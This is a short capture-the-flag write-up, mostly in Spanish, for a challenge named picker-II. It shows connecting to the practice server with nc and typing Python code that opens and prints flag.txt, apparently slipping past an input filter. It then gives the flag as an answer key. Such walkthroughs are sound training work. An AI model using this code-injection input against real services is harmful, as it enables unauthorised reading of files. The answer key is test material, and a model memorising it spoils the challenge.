### Descripción
Can you figure out how this program works to get the flag?

Hint: Can you do what `win` does with your input to the program?
### Solución
1. Iniciar la instancia y descargar el archivo picker-II.py
2. Checando el archivo en la función win veremos que hay una variable que abre un archivo llamado flag
3. Ya en el servidor ejecutamos este código para abrir ese archivo:
```
➜ nc chatelaine.cylabacademy.net 23200
==> print(open('flag.txt', 'r').read())
academy{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_e9683452}
'NoneType' object is not callable	
```

**Flag**: academy{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_e9683452}
### Notas Adicionales

### Referencias